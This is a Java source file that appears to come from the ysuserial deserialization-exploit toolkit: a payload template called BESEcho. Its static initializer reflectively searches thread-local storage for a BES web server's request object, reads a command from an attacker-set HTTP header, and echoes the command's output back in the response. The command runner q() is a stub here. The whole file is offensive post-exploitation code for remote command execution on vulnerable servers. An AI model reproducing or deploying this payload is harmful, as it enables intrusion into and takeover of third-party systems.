package org.su18.ysuserial.payloads.templates.echo;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

public class BESEcho {
    public static String CMD_HEADER;
    static {
        try {
            ClassLoader loader = Thread.currentThread().getContextClassLoader();
            Thread thread = Thread.currentThread();
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            Object threadLocalMap = threadLocals.get(thread);

            Class<?> threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] objects = (Object[]) tableField.get(threadLocalMap);

            Class<?> entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);

            for (Object object : objects) {
                if (object != null) {
                    Object valueObject = entryValueField.get(object);
                    if (valueObject != null && valueObject.getClass().getName().equals("com.bes.enterprise.webtier.connector.Request")) {

                        Class<?> requestClass = Class.forName("com.bes.enterprise.webtier.connector.Request", false, loader);

                        String cmd1 = (String) requestClass.getMethod("getHeader", String.class)
                                .invoke(valueObject, CMD_HEADER);

                        ByteArrayOutputStream baos = q(cmd1);
                        
                        String output = null;
                        if (baos != null) {
                            output = baos.toString();
                        }

                        Object response = requestClass.getMethod("getResponse")
                                .invoke(valueObject);
                                
                        try (OutputStream outputStream = (OutputStream)response.getClass()
                                .getMethod("getOutputStream")
                                .invoke(response)) {
                            outputStream.write(output.getBytes());
                            outputStream.flush();
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }
}